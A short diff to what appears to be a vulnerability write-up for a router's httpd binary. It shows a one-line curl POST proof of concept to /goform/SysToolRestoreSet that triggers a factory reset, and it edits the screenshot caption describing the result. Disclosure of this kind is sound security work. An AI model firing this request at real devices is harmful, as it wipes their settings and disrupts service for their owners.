@@ -14,6 +14,4 @@ In the httpd binary, the function `fromSysToolRestoreSet` handles requests to `/
 curl -i -X POST http://192.168.0.1/goform/SysToolRestoreSet
 ```
 
-The device resets to factory defaults and reboots.
-
-![Factory reset triggered](screenshots/2.png)
+![PoC result](screenshots/2.png)
